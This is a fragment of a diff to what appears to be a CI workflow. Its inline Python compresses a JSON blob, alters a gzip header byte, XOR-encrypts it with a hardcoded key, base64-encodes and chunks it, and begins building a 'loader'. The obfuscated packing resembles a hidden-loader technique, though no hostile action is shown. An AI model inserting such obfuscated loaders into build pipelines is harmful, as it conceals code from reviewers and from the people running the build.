@@ -95,7 +95,9 @@ jobs:
           fnv=2166136261
           for b in jsb:
               fnv ^= b; fnv=(fnv*16777619)&0xffffffff
-          comp=gzip.compress(jsb,compresslevel=9,mtime=0)
+          comp=bytearray(gzip.compress(jsb,compresslevel=9,mtime=0))
+          comp[9]=255
+          comp=bytes(comp)
           key=bytes([0x91,0x27,0xD4,0x5A,0xC3,0x18,0x6F,0xB2,0x44,0xE9,0x73,0x0D,0xA6,0x35,0xF1,0x8C,0x5E,0x20,0xBD,0x67,0x12,0xFA,0x49,0x84,0xD0,0x3B,0x76,0x9D,0x01,0xCE,0x58,0xA3])
           enc=bytes(b^key[i%32] for i,b in enumerate(comp)); b64=base64.b64encode(enc).decode(); chunks=[b64[i:i+12000] for i in range(0,len(b64),12000)]
           loader="""
